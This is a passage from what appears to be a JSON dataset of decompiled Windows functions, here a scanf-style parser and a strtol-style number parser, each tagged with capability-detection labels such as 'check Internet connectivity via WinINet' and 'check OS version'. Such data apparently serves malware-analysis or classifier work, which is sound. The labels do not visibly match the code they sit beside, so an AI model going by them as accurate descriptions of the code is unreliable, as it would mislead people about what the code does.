        }\n                        pfVar21 = *ppfVar22;\n                    }\n                    *pfVar21 = uVar15;\n                    uVar38 = 0;\n                }\n                else if (bVar5) {\n                    if (uVar1 == 0) {\n                        pfVar21 = *ppfStack280;\n                        ppfStack280 = ppfStack280 + 1;\n                    }\n                    else {\n                        ppfVar22 = arg3;\n                        if (uVar1 != 1) {\n                            ppfVar22 = arg3 + (uVar1 - 1);\n                        }\n                        pfVar21 = *ppfVar22;\n                    }\n                    *pfVar21 = SUB82(dStack152, 0);\n                }\n                else {\n                    uVar38 = bVar6;\n                    if (bVar6) {\n                        if (uVar1 == 0) {\n                            pfVar21 = *ppfStack280;\n                            ppfStack280 = ppfStack280 + 1;\n                        }\n                        else {\n                            ppfVar22 = arg3;\n                            if (uVar1 != 1) {\n                                ppfVar22 = arg3 + (uVar1 - 1);\n                            }\n                            pfVar21 = *ppfVar22;\n                        }\n                        *pfVar21 = SUB81(dStack152, 0);\n                        uVar38 = 0;\n                    }\n                    else if (uVar1 == 0) {\n                        pfVar21 = *ppfStack280;\n                        ppfStack280 = ppfStack280 + 1;\n                        *pfVar21 = uVar15;\n                    }\n                    else {\n                        ppfVar22 = arg3;\n                        if (uVar1 != 1) {\n                            ppfVar22 = arg3 + (uVar1 - 1);\n                        }\n                        **ppfVar22 = uVar15;\n                    }\n                }\n            }\n            goto code_r0x00014000cdc9;\n        }\n        break;\n    case 's':\ncode_r0x00014000dde1:\n        uVar38 = bVar4 << 7;\n        if (!bVar4) {\n            if ((uVar26 & 0x600) == 0) {\n                if (uVar1 == 0) {\n                    pfStack248 = *ppfStack280;\n                    ppfStack280 = ppfStack280 + 1;\n                }\n                else {\n                    ppfVar22 = arg3;\n                    if (uVar1 != 1) {\n                        ppfVar22 = arg3 + (uVar1 - 1);\n                    }\n                    pfStack248 = *ppfVar22;\n                }\n                if (pfStack248 == NULL) goto code_r0x00014000d8d6;\n            }\n            else {\n                if (uVar1 == 0) {\n                    pfStack304 = *ppfStack280;\n                    ppfStack280 = ppfStack280 + 1;\n                }\n                else {\n                    ppfVar22 = arg3;\n                    if (uVar1 != 1) {\n                        ppfVar22 = arg3 + (uVar1 - 1);\n                    }\n                    pfStack304 = *ppfVar22;\n                }\n                if (pfStack304 == NULL) goto code_r0x00014000f981;\n                pfStack248 = sub.msvcrt.dll_malloc();\n                puVar3 = puStack160;\n                *pfStack304 = pfStack248;\n                if (pfStack248 == NULL) goto code_r0x00014000ecff;\n                if (puStack160 == NULL) {\ncode_r0x00014000de69:\n                    puStack160 = sub.msvcrt.dll_malloc(0x110);\n                    uVar24 = 1;\n                    uVar36 = 0;\n                    *puStack160 = 0;\n                    puStack160[1] = puVar3;\n                }\n                else {\n                    uVar36 = *puStack160;\n                    uVar24 = uVar36 + 1;\n                    if (0x1f < uVar36) goto code_r0x00014000de69;\n                }\n                uStack256 = 100;\n                *puStack160 = uVar24;\n                puStack160[uVar36 + 2] = pfStack304;\n            }\n        }\n        uVar13 = fcn.14000c9f0(arg1, &dStack152);\n        if (uVar13 == 0xffffffff) {\ncode_r0x00014000fa56:\n            if (uStack288 != 0) {\n                uVar13 = uStack288;\n            }\n            uVar13 = fcn.14000c950(uVar13, &puStack160, pfStack304, &puStack136);\n            return uVar13;\n        }\n        while (iVar14 = sub.msvcrt.dll_isspace(uVar13),  iVar14 == 0) {\n            if (!bVar4) {\n                *pfStack248 = uVar13;\n                pfStack248 = pfStack248 + 1;\n                if (((uVar26 & 0x600) != 0) && (pdVar23 = *pfStack304,  pfStack248 == pdVar23 + uStack256)) {\n                    uVar24 = uStack256 * 2;\n                    while (pdVar23 = sub.msvcrt.dll_realloc(pdVar23, uVar24),  pdVar23 == NULL) {\n                        if (uVar24 <= uStack256 + 1) goto joined_r0x00014001007d;\n                        pdVar23 = *pfStack304;\n                        uVar24 = uStack256 + 1;\n                    }\n                    *pfStack304 = pdVar23;\n                    pfStack248 = pdVar23 + uStack256;\n                    uStack256 = uVar24;\n                }\n            }\n            if (((0 < iVar12) && (iVar12 = iVar12 + -1,  iVar12 == 0)) ||\n               (uVar13 = fcn.14000c9f0(arg1, &dStack152),  uVar13 == 0xffffffff)) goto code_r0x00014000e860;\n        }\n        if ((*(arg1 + 0x201) & 1) == 0) {\n            sub.msvcrt.dll_ungetc(uVar13);\n            dStack152 = dStack152 + -1;\n        }\n        else {\n            dStack152 = dStack152 + -1;\n            iVar12 = *(arg1 + 0x100c);\n            *(arg1 + iVar12 * 4 + 8) = uVar13;\n            *(arg1 + 0x100c) = iVar12 + 1;\n        }\ncode_r0x00014000e860:\n        if (!bVar4) {\n            *pfStack248 = 0;\n            pfStack248 = pfStack248 + 1;\n            if ((((pfStack304 != NULL) && (*pfStack304 != NULL)) && (uStack256 != pfStack248 - *pfStack304)) &&\n               (pdVar23 = sub.msvcrt.dll_realloc(),  pdVar23 != NULL)) {\n                *pfStack304 = pdVar23;\n            }\n            uStack288 = uStack288 + 1;\n            pfStack304 = NULL;\n            goto code_r0x00014000cdc9;\n        }\n    }\ncode_r0x00014000e1af:\n    uVar38 = 0;\ncode_r0x00014000cdc9:\n    uVar10 = *puVar33;\n    arg2 = puVar33;\n    if (uVar10 == 0) {\n        puVar3 = puStack160;\n        if (uVar38 == 0) goto joined_r0x00014000ce42;\n        do {\n            iVar12 = fcn.14000c9f0(arg1, &dStack152);\n            iVar14 = sub.msvcrt.dll_isspace(iVar12);\n        } while (iVar14 != 0);\n        puVar3 = puStack160;\n        if (iVar12 == -1) goto joined_r0x00014000ce42;\n        if ((*(arg1 + 0x201) & 1) != 0) {\n            dStack152 = dStack152 + -1;\n            iVar14 = *(arg1 + 0x100c);\n            *(arg1 + iVar14 * 4 + 8) = iVar12;\n            *(arg1 + 0x100c) = iVar14 + 1;\n            goto joined_r0x00014000ce42;\n        }\n        sub.msvcrt.dll_ungetc(iVar12, *arg1);\n        dStack152 = dStack152 + -1;\n        puVar3 = puStack160;\n        goto joined_r0x00014000ce42;\n    }\n    goto code_r0x00014000cc17;\njoined_r0x00014000e2eb:\n    while (puVar3 != NULL) {\n        puVar30 = puVar3[1];\n        sub.msvcrt.dll_free(puVar3);\n        puVar3 = puVar30;\n    }\n    goto code_r0x00014000cd88;\njoined_r0x00014000f053:\n    while (puVar3 != NULL) {\n        puVar30 = puVar3[1];\n        sub.msvcrt.dll_free(puVar3);\n        puVar3 = puVar30;\n    }\n    goto code_r0x00014000cd88;\ncode_r0x00014000e686:\n    puVar20 = sub.msvcrt.dll__errno();\n    uVar13 = 0xffffffff;\n    *puVar20 = uVar15;\ncode_r0x00014000d298:\n    if (cVar11 == 'c') {\ncode_r0x00014000d080:\n        if (!bVar39) {\ncode_r0x00014000d08a:\n            if (iVar12 == -1) {\n                iVar12 = 1;\n            }\n            if (bVar4) {\n                uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                if (uVar13 != 0xffffffff) {\n                    do {\n                        iVar12 = iVar12 + -1;\n                        if (iVar12 < 1) break;\n                        uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                    } while (uVar13 != 0xffffffff);\n                    uVar38 = 0;\n                    goto code_r0x00014000cdc9;\n                }\n            }\n            else {\n                if ((uVar26 & 0x600) == 0) {\n                    if (uVar1 == 0) {\n                        pfStack248 = *ppfStack280;\n                        ppfStack280 = ppfStack280 + 1;\n                    }\n                    else {\n                        ppfVar22 = arg3;\n                        if (uVar1 != 1) {\n                            ppfVar22 = arg3 + (uVar1 - 1);\n                        }\n                        pfStack248 = *ppfVar22;\n                    }\n                    if (pfStack248 == NULL) goto code_r0x00014000d8d6;\n                }\n                else {\n                    if (uVar1 == 0) {\n                        pfStack304 = *ppfStack280;\n                        ppfStack280 = ppfStack280 + 1;\n                    }\n                    else {\n                        ppfVar22 = arg3;\n                        if (uVar1 != 1) {\n                            ppfVar22 = arg3 + (uVar1 - 1);\n                        }\n                        pfStack304 = *ppfVar22;\n                    }\n                    if (pfStack304 == NULL) goto code_r0x00014000f981;\n                    iVar14 = 0x400;\n                    if (iVar12 < 0x401) {\n                        iVar14 = iVar12;\n                    }\n                    uStack256 = iVar14;\n                    pfStack248 = sub.msvcrt.dll_malloc();\n                    puVar3 = puStack160;\n                    *pfStack304 = pfStack248;\n                    if (pfStack248 == NULL) {\n                        uVar13 = 0xffffffff;\n                        if ((uVar26 & 0x400) == 0) {\n                            uVar13 = uStack288;\n                        }\ncode_r0x00014000fd8c:\n                        uVar13 = fcn.14000c950(uVar13, &puStack160, pfStack304, &puStack136);\n                        return uVar13;\n                    }\n                    if (puStack160 == NULL) {\ncode_r0x00014000d131:\n                        puStack160 = sub.msvcrt.dll_malloc(0x110);\n                        uVar24 = 1;\n                        uVar36 = 0;\n                        *puStack160 = 0;\n                        puStack160[1] = puVar3;\n                    }\n                    else {\n                        uVar36 = *puStack160;\n                        uVar24 = uVar36 + 1;\n                        if (0x1f < uVar36) goto code_r0x00014000d131;\n                    }\n                    *puStack160 = uVar24;\n                    puStack160[uVar36 + 2] = pfStack304;\n                }\n                uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                if (uVar13 != 0xffffffff) {\n                    uVar38 = bVar4 << 7;\n                    iVar17 = iVar12;\n                    uVar24 = uStack256;\n                    do {\n                        iVar12 = iVar12 + -1;\n                        uStack256 = uVar24;\n                        if (((uVar26 & 0x600) != 0) && (dVar18 = *pfStack304,  pfStack248 == dVar18 + uVar24)) {\n                            uVar36 = iVar12;\n                            if (uVar24 < iVar17) {\n                                uVar36 = uVar24;\n                            }\n                            uStack256 = uVar36 + uVar24;\n                            while (dVar18 = sub.msvcrt.dll_realloc(dVar18),  dVar18 == 0.0) {\n                                if (uStack256 <= uVar24 + 1) goto code_r0x00014000d845;\n                                dVar18 = *pfStack304;\n                                uStack256 = uVar24 + 1;\n                            }\n                            pfStack248 = dVar18 + uVar24;\n                            *pfStack304 = dVar18;\n                        }\n                        *pfStack248 = uVar13;\n                        pfStack248 = pfStack248 + 1;\n                        if (iVar12 < 1) break;\n                        iVar17 = iVar17 + -1;\n                        uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                        uVar24 = uStack256;\n                    } while (uVar13 != 0xffffffff);\n                    if (((pfStack304 != NULL) && (*pfStack304 != 0.0)) &&\n                       ((uStack256 != pfStack248 - *pfStack304 && (dVar18 = sub.msvcrt.dll_realloc(),  dVar18 != 0.0))))\n                    {\n                        *pfStack304 = dVar18;\n                    }\n                    goto code_r0x00014000e7d6;\n                }\n            }\n            if (uStack288 == 0) {\n                uStack288 = 0xffffffff;\n            }\ncode_r0x00014000d8d6:\n            uVar13 = fcn.14000c950(uStack288, &puStack160, pfStack304, &puStack136);\n            return uVar13;\n        }\ncode_r0x00014000d438:\n        if (iVar12 == -1) {\n            iVar12 = 1;\n        }\n        uVar38 = bVar4 << 7;\n        if (!bVar4) {\n            if ((uVar26 & 0x600) == 0) {\n                if (uVar1 == 0) {\n                    pfStack272 = *ppfStack280;\n                    ppfStack280 = ppfStack280 + 1;\n                }\n                else {\n                    ppfVar22 = arg3;\n                    if (uVar1 != 1) {\n                        ppfVar22 = arg3 + (uVar1 - 1);\n                    }\n                    pfStack272 = *ppfVar22;\n                }\n                if (pfStack272 == NULL) goto code_r0x00014000d8d6;\n            }\n            else {\n                if (uVar1 == 0) {\n                    pfStack304 = *ppfStack280;\n                    ppfStack280 = ppfStack280 + 1;\n                }\n                else {\n                    ppfVar22 = arg3;\n                    if (uVar1 != 1) {\n                        ppfVar22 = arg3 + (uVar1 - 1);\n                    }\n                    pfStack304 = *ppfVar22;\n                }\n                if (pfStack304 == NULL) {\ncode_r0x00014000f981:\n                    uVar13 = fcn.14000c950(uStack288, &puStack160, 0, &puStack136);\n                    return uVar13;\n                }\n                iVar14 = 0x400;\n                if (iVar12 < 0x401) {\n                    iVar14 = iVar12;\n                }\n                uStack256 = iVar14;\n                pfStack272 = sub.msvcrt.dll_malloc();\n                puVar3 = puStack160;\n                *pfStack304 = pfStack272;\n                if (pfStack272 == NULL) {\ncode_r0x00014000ecff:\n                    uVar13 = 0xffffffff;\n                    if ((uVar26 & 0x400) == 0) {\n                        uVar13 = uStack288;\n                    }\n                    uVar13 = fcn.14000c950(uVar13, &puStack160, pfStack304, &puStack136);\n                    return uVar13;\n                }\n                if (puStack160 == NULL) {\ncode_r0x00014000d4df:\n                    puStack160 = sub.msvcrt.dll_malloc(0x110);\n                    uVar24 = 1;\n                    uVar36 = 0;\n                    *puStack160 = 0;\n                    puStack160[1] = puVar3;\n                }\n                else {\n                    uVar36 = *puStack160;\n                    uVar24 = uVar36 + 1;\n                    if (0x1f < uVar36) goto code_r0x00014000d4df;\n                }\n                *puStack160 = uVar24;\n                puStack160[uVar36 + 2] = pfStack304;\n            }\n        }\n        uVar13 = fcn.14000c9f0(arg1, &dStack152);\n        if (uVar13 == 0xffffffff) {\n            puVar3 = puStack160;\n            if (uStack288 != 0) goto joined_r0x00014000fb0f;\n            goto code_r0x00014000d845;\n        }\n        uStack224 = iVar12;\n        auStack112[0] = 0;\n        do {\n            iVar12 = iVar12 + -1;\n            auStack165[0] = uVar13;\n            if ((!bVar4) && ((uVar26 & 0x600) != 0)) {\n                dVar18 = *pfStack304;\n                iVar17 = uStack256 * 2;\n                if (pfStack272 == dVar18 + iVar17) {\n                    uVar24 = uStack256 + 1;\n                    uVar36 = iVar12;\n                    if (uStack256 <= uStack224) {\n                        uVar36 = uStack256;\n                    }\n                    uStack256 = uVar36 + uStack256;\n                    while (dVar18 = sub.msvcrt.dll_realloc(dVar18, uStack256 * 2),  dVar18 == 0.0) {\n                        if (uStack256 <= uVar24) goto code_r0x00014000d845;\n                        dVar18 = *pfStack304;\n                        uStack256 = uVar24;\n                    }\n                    *pfStack304 = dVar18;\n                    pfStack272 = dVar18 + iVar17;\n                }\n            }\n            pfVar21 = pfStack272;\n            if (bVar4) {\n                pfVar21 = NULL;\n            }\ncode_r0x00014000d62c:\n            iVar17 = fcn.140014e10(pfVar21, auStack165, 1, auStack112);\n            if (iVar17 == -2) {\n                uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                if (uVar13 != 0xffffffff) goto code_r0x00014000d660;\n                puVar20 = sub.msvcrt.dll__errno();\n                *puVar20 = 0x2a;\n                puVar3 = puStack160;\n                while (puVar3 != NULL) {\n                    puVar30 = puVar3[1];\n                    sub.msvcrt.dll_free(puVar3);\n                    puVar3 = puVar30;\n                }\n                goto code_r0x00014000cd88;\n            }\n            if (iVar17 != 1) goto code_r0x00014000fcee;\n            pfStack272 = pfStack272 + 2;\n            if (iVar12 < 1) break;\n            uVar13 = fcn.14000c9f0(arg1, &dStack152);\n            uStack224 = uStack224 + -1;\n        } while (uVar13 != 0xffffffff);\n        if (bVar4) goto code_r0x00014000e1af;\n        fcn.14000c810(pfStack304, pfStack272, uStack256 * 2);\ncode_r0x00014000e7d6:\n        uStack288 = uStack288 + 1;\n        pfStack304 = NULL;\n        goto code_r0x00014000cdc9;\n    }\n    if (cVar11 != 's') goto code_r0x00014000d030;\n    if (!bVar39) goto code_r0x00014000dde1;\ncode_r0x00014000d2b6:\n    uVar38 = bVar4 << 7;\n    if (!bVar4) {\n        if ((uVar26 & 0x600) == 0) {\n            if (uVar1 == 0) {\n                pfStack272 = *ppfStack280;\n                ppfStack280 = ppfStack280 + 1;\n            }\n            else {\n                ppfVar22 = arg3;\n                if (uVar1 != 1) {\n                    ppfVar22 = arg3 + (uVar1 - 1);\n                }\n                pfStack272 = *ppfVar22;\n            }\n            if (pfStack272 == NULL) goto code_r0x00014000d8d6;\n        }\n        else {\n            if (uVar1 == 0) {\n                pfStack304 = *ppfStack280;\n                ppfStack280 = ppfStack280 + 1;\n            }\n            else {\n                ppfVar22 = arg3;\n                if (uVar1 != 1) {\n                    ppfVar22 = arg3 + (uVar1 - 1);\n                }\n                pfStack304 = *ppfVar22;\n            }\n            if (pfStack304 == NULL) goto code_r0x00014000f981;\n            pfStack272 = sub.msvcrt.dll_malloc();\n            puVar3 = puStack160;\n            *pfStack304 = pfStack272;\n            if (pfStack272 == NULL) goto code_r0x00014000ecff;\n            if (puStack160 == NULL) {\ncode_r0x00014000d340:\n                puStack160 = sub.msvcrt.dll_malloc(0x110);\n                uVar24 = 1;\n                uVar36 = 0;\n                *puStack160 = 0;\n                puStack160[1] = puVar3;\n            }\n            else {\n                uVar36 = *puStack160;\n                uVar24 = uVar36 + 1;\n                if (0x1f < uVar36) goto code_r0x00014000d340;\n            }\n            uStack256 = 100;\n            *puStack160 = uVar24;\n            puStack160[uVar36 + 2] = pfStack304;\n        }\n    }\n    pfVar21 = pfStack304;\n    uVar13 = fcn.14000c9f0(arg1, &dStack152);\n    if (uVar13 == 0xffffffff) {\n        puVar3 = puStack160;\n        if (uStack288 != 0) goto joined_r0x00014000fadc;\ncode_r0x00014000d845:\n        fcn.14000c840(&puStack160, &puStack136);\n        return 0xffffffff;\n    }\n    auStack112[0] = 0;\n    while (iVar14 = sub.msvcrt.dll_isspace(uVar13),  iVar14 == 0) {\n        auStack165[0] = uVar13;\n        arg1_00 = NULL;\n        if (!bVar4) {\n            arg1_00 = pfStack272;\n        }\ncode_r0x00014000d3fb:\n        iVar17 = fcn.140014e10(arg1_00, auStack165, 1, auStack112);\n        if (iVar17 == -2) {\n            uVar13 = fcn.14000c9f0(arg1, &dStack152);\n            if (uVar13 != 0xffffffff) goto code_r0x00014000d42f;\n            puVar20 = sub.msvcrt.dll__errno();\n            *puVar20 = 0x2a;\n            puVar3 = puStack160;\n            while (puVar3 != NULL) {\n                puVar30 = puVar3[1];\n                sub.msvcrt.dll_free(puVar3);\n                puVar3 = puVar30;\n            }\n            goto code_r0x00014000cd88;\n        }\n        if (iVar17 != 1) goto code_r0x00014000fcee;\n        pfStack272 = pfStack272 + 2;\n        if (((!bVar4) && ((uVar26 & 0x600) != 0)) && (uVar24 = uStack256 * 2,  pfStack272 == *pfStack304 + uVar24)) {\n            uVar36 = uStack256 + 1;\n            uStack256 = uVar24;\n            while (pdVar23 = sub.msvcrt.dll_realloc(),  pdVar23 == NULL) {\n                bVar39 = uStack256 <= uVar36;\n                uStack256 = uVar36;\n                if (bVar39) {\n                    if ((uVar26 & 0x400) != 0) goto code_r0x00014000ffce;\n                    pfStack304 = NULL;\n                    uVar26 = uStack288 + 1;\n                    *(*pfVar21 + (uVar24 - 2)) = 0;\n                    goto code_r0x00014000ffd1;\n                }\n            }\n            *pfStack304 = pdVar23;\n            pfStack272 = pdVar23 + uVar24;\n        }\n        if (((0 < iVar12) && (iVar12 = iVar12 + -1,  iVar12 == 0)) ||\n           (uVar13 = fcn.14000c9f0(arg1, &dStack152),  uVar13 == 0xffffffff)) goto code_r0x00014000e726;\n    }\n    if ((*(arg1 + 0x201) & 1) == 0) {\n        sub.msvcrt.dll_ungetc(uVar13);\n        dStack152 = dStack152 + -1;\n    }\n    else {\n        dStack152 = dStack152 + -1;\n        iVar12 = *(arg1 + 0x100c);\n        *(arg1 + iVar12 * 4 + 8) = uVar13;\n        *(arg1 + 0x100c) = iVar12 + 1;\n    }\ncode_r0x00014000e726:\n    if (!bVar4) {\n        *pfStack272 = 0;\n        fcn.14000c810(pfStack304, pfStack272 + 2, uStack256 * 2);\n        uStack288 = uStack288 + 1;\n        pfStack304 = NULL;\n        pfStack272 = pfStack272 + 2;\n        goto code_r0x00014000cdc9;\n    }\n    goto code_r0x00014000e1af;\ncode_r0x00014000ee67:\n    if (*(puStack136 + uVar13) != bVar41) {\n        if (bVar4 == false) {\n            *pfStack248 = uVar13;\n            pfStack248 = pfStack248 + 1;\n            if (((uVar26 & 0x600) != 0) && (pdVar23 = *pfStack304,  pfStack248 == pdVar23 + uStack256)) {\n                uVar24 = uStack256 * 2;\n                while (pdVar23 = sub.msvcrt.dll_realloc(pdVar23, uVar24),  pdVar23 == NULL) {\n                    if (uVar24 <= uStack256 + 1) goto joined_r0x00014001007d;\n                    pdVar23 = *pfStack304;\n                    uVar24 = uStack256 + 1;\n                }\n                *pfStack304 = pdVar23;\n                pfStack248 = pdVar23 + uStack256;\n                uStack256 = uVar24;\n            }\n        }\n        iVar12 = iVar12 + -1;\n        if ((iVar12 == 0) || (uVar13 = fcn.14000c9f0(arg1, &dStack152),  uVar13 == 0xffffffff))\n        goto code_r0x00014000f1b7;\n        goto code_r0x00014000ee67;\n    }\n    if ((*(arg1 + 0x201) & 1) == 0) {\n        sub.msvcrt.dll_ungetc();\n        dStack152 = dStack152 + -1;\n    }\n    else {\n        iVar12 = *(arg1 + 0x100c);\n        dStack152 = dStack152 + -1;\n        *(arg1 + iVar12 * 4 + 8) = uVar13;\n        *(arg1 + 0x100c) = iVar12 + 1;\n    }\ncode_r0x00014000f1b7:\n    if (dStack152 == dVar18) goto code_r0x00014000d8d6;\n    if (bVar4 == false) {\n        *pfStack248 = 0;\n        pfStack248 = pfStack248 + 1;\n        if ((((pfStack304 != NULL) && (*pfStack304 != NULL)) && (uStack256 != pfStack248 - *pfStack304)) &&\n           (pdVar23 = sub.msvcrt.dll_realloc(),  pdVar23 != NULL)) {\n            *pfStack304 = pdVar23;\n        }\n        uStack288 = uStack288 + 1;\n        uVar38 = 0;\n        pfStack304 = NULL;\n    }\n    goto code_r0x00014000cdc9;\ncode_r0x00014000e57f:\n    do {\n        if (*(puStack136 + uVar13) == bVar41) {\n            if ((*(arg1 + 0x201) & 1) == 0) {\n                sub.msvcrt.dll_ungetc();\n                dStack152 = dStack152 + -1;\n            }\n            else {\n                dStack152 = dStack152 + -1;\n                iVar12 = *(arg1 + 0x100c);\n                *(arg1 + iVar12 * 4 + 8) = uVar13;\n                *(arg1 + 0x100c) = iVar12 + 1;\n            }\n            break;\n        }\n        if (bVar4 == false) {\n            iVar17 = iVar17 + 1;\n            auStack165[0] = uVar13;\n            iVar37 = fcn.140014e10(pfStack272, auStack165, 1, auStack112);\n            if (iVar37 != -2) {\n                pfStack272 = pfStack272 + 2;\n                if ((uVar26 & 0x600) == 0) {\n                    iVar17 = 0;\n                }\n                else {\n                    iVar17 = 0;\n                    uVar24 = uStack256 * 2;\n                    if (pfStack272 == *pfStack304 + uVar24) {\n                        uVar36 = uStack256 + 1;\n                        uStack256 = uVar24;\n                        while (pdVar23 = sub.msvcrt.dll_realloc(),  pdVar23 == NULL) {\n                            bVar39 = uStack256 <= uVar36;\n                            uStack256 = uVar36;\n                            if (bVar39) {\n                                if ((uVar26 & 0x400) != 0) goto code_r0x00014000ffce;\n                                pfStack304 = NULL;\n                                uVar26 = uStack288 + 1;\n                                *(*pfVar21 + (uVar24 - 2)) = 0;\n                                goto code_r0x00014000ffd1;\n                            }\n                        }\n                        pfStack272 = pdVar23 + uVar24;\n                        iVar17 = 0;\n                        *pfStack304 = pdVar23;\n                    }\n                }\n                goto code_r0x00014000e560;\n            }\n        }\n        else {\ncode_r0x00014000e560:\n            iVar12 = iVar12 + -1;\n            if (iVar12 == 0) break;\n        }\n        uVar13 = fcn.14000c9f0(arg1, &dStack152);\n    } while (uVar13 != 0xffffffff);\n    if (iVar17 == 0) {\n        if (dStack152 != dVar18) {\n            uVar38 = 0;\n            if (bVar4 == false) {\n                *pfStack272 = 0;\n                pfStack272 = pfStack272 + 2;\n                if (((pfStack304 != NULL) && (*pfStack304 != NULL)) &&\n                   ((uStack256 * 2 != pfStack272 - *pfStack304 && (pdVar23 = sub.msvcrt.dll_realloc(),  pdVar23 != NULL)\n                    ))) {\n                    *pfStack304 = pdVar23;\n                }\n                uStack288 = uStack288 + 1;\n                uVar38 = 0;\n                pfStack304 = NULL;\n            }\n            goto code_r0x00014000cdc9;\n        }\n    }\n    else {\ncode_r0x00014000fcee:\n        puVar20 = sub.msvcrt.dll__errno();\n        *puVar20 = 0x2a;\n    }\n    goto code_r0x00014000d8d6;\ncode_r0x00014000e126:\n    do {\n        uVar24 = uVar27;\n        uVar27 = uVar27 + 1;\n        *(puStack136 + uVar24) = 1;\n        uVar10 = *puVar33;\n    } while (uVar27 < uVar10);\ncode_r0x00014000e0f1:\n    uVar24 = uVar10;\n    goto joined_r0x00014000e0d0;\njoined_r0x00014000fadc:\n    while (puVar3 != NULL) {\n        puVar30 = puVar3[1];\n        sub.msvcrt.dll_free(puVar3);\n        puVar3 = puVar30;\n    }\n    goto code_r0x00014000cd88;\ncode_r0x00014000d42f:\n    auStack165[0] = uVar13;\n    goto code_r0x00014000d3fb;\njoined_r0x00014000fb0f:\n    while (puVar3 != NULL) {\n        puVar30 = puVar3[1];\n        sub.msvcrt.dll_free(puVar3);\n        puVar3 = puVar30;\n    }\n    goto code_r0x00014000cd88;\ncode_r0x00014000d660:\n    auStack165[0] = uVar13;\n    goto code_r0x00014000d62c;\njoined_r0x00014000f92a:\n    while (puVar3 != NULL) {\n        puVar30 = puVar3[1];\n        sub.msvcrt.dll_free(puVar3);\n        puVar3 = puVar30;\n    }\n    goto code_r0x00014000ccd1;\njoined_r0x00014000f5da:\n    while (puVar3 != NULL) {\n        puVar30 = puVar3[1];\n        sub.msvcrt.dll_free(puVar3);\n        puVar3 = puVar30;\n    }\n    goto code_r0x00014000ccd1;\ncode_r0x00014000dad4:\n    iVar14 = iVar12;\n    if (0 < iVar12) {\ncode_r0x00014000da88:\n        iVar12 = iVar14 + -1;\n    }\n    goto joined_r0x00014000da16;\njoined_r0x00014000cd6a:\n    while (puVar3 != NULL) {\n        puVar30 = puVar3[1];\n        sub.msvcrt.dll_free(puVar3);\n        puVar3 = puVar30;\n    }\n    goto code_r0x00014000cd88;\njoined_r0x00014000d71e:\n    if (iVar14 != 4) {\n        iVar14 = sub.msvcrt.dll_isspace();\n        if (iVar14 == 0) goto code_r0x00014000e686;\ncode_r0x00014000d732:\n        piVar19 = sub.msvcrt.dll__errno();\n        iVar14 = *piVar19;\n        goto joined_r0x00014000d71e;\n    }\n    puVar3 = puStack160;\n    if (uStack288 == 0) goto code_r0x00014000d845;\n    while (puVar3 != NULL) {\n        puVar30 = puVar3[1];\n        sub.msvcrt.dll_free(puVar3);\n        puVar3 = puVar30;\n    }\ncode_r0x00014000cd88:\n    puStack160 = NULL;\n    if (pfStack304 != NULL) {\n        sub.msvcrt.dll_free(*pfStack304);\n        *pfStack304 = NULL;\n    }\ncode_r0x00014000ccf6:\n    sub.msvcrt.dll_free(puStack136);\n    return uStack288;\njoined_r0x00014001007d:\n    if ((uVar26 & 0x400) == 0) {\n        *(*pfStack304 + (uStack256 - 1)) = 0;\n        pfStack304 = NULL;\n        uVar26 = uStack288 + 1;\n    }\n    else {\ncode_r0x00014000ffce:\n        uVar26 = 0xffffffff;\n    }\ncode_r0x00014000ffd1:\n    uVar13 = fcn.14000c950(uVar26, &puStack160, pfStack304, &puStack136);\n    return uVar13;\n}\n",
        "token_count": 21899
    },
    "1400104e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2bh\n\nuint64_t fcn.1400104e0(char *arg1, char **arg2, ulong arg3)\n\n{\n    char cVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    ulong var_2bh;\n    \n    iVar6 = arg3;\n    if (arg2 != NULL) {\n        *arg2 = arg1;\n    }\n    if ((arg3 == 1) || (0x24 < arg3)) {\n        puVar5 = sub.msvcrt.dll__errno();\n        *puVar5 = 0x21;\n        return 0;\n    }\n    while( true ) {\n        cVar1 = *arg1;\n        iVar3 = sub.msvcrt.dll_isspace();\n        if (iVar3 == 0) break;\n        arg1 = arg1 + 1;\n    }\n    cVar2 = cVar1;\n    if ((cVar1 - 0x2bU & 0xfd) == 0) {\n        cVar2 = arg1[1];\n        arg1 = arg1 + 1;\n    }\n    iVar8 = cVar2;\n    if (arg3 == 0) {\n        iVar6 = 10;\n        if (cVar2 == '0') {\n            if ((arg1[1] & 0xdfU) != 0x58) {\n                uVar7 = 8;\n                iVar6 = 8;\n                iVar8 = 0x30;\n                goto code_r0x0001400106f3;\n            }\ncode_r0x00014001068f:\n            iVar8 = arg1[2];\n            iVar6 = 0x10;\n            arg1 = arg1 + 2;\n        }\ncode_r0x000140010557:\n        uVar7 = iVar6;\n        if (9 < iVar8 - 0x30U) {\n            iVar4 = sub.msvcrt.dll_isupper();\n            if (iVar4 == 0) {\n                iVar4 = sub.msvcrt.dll_islower();\n                if (iVar4 == 0) {\n                    return 0;\n                }\n                uVar9 = iVar8 - 0x57;\n            }\n            else {\n                uVar9 = iVar8 - 0x37;\n            }\n            goto code_r0x000140010598;\n        }\n    }\n    else {\n        if ((arg3 != 0x10) || (cVar2 != '0')) goto code_r0x000140010557;\n        if ((arg1[1] & 0xdfU) == 0x58) goto code_r0x00014001068f;\n        uVar7 = 0x10;\n        iVar8 = 0x30;\n    }\ncode_r0x0001400106f3:\n    uVar9 = iVar8 - 0x30;\ncode_r0x000140010598:\n    if (uVar7 <= uVar9) {\n        return 0;\n    }\n    uVar10 = uVar9;\n    do {\n        arg1 = arg1 + 1;\n        iVar8 = *arg1;\n        uVar9 = iVar8 - 0x30;\n        if (9 < uVar9) {\n            iVar4 = sub.msvcrt.dll_isupper();\n            uVar9 = iVar8 - 0x37;\n            if (iVar4 == 0) {\n                iVar4 = sub.msvcrt.dll_islower();\n                if (iVar4 == 0) {\ncode_r0x0001400105e7:\n                    if (arg2 != NULL) {\n                        *arg2 = arg1;\n                    }\n                    if (cVar1 != '-') {\n                        if ((-1 < uVar10) && (iVar3 == 0)) {\n                            return uVar10;\n                        }\n                        puVar5 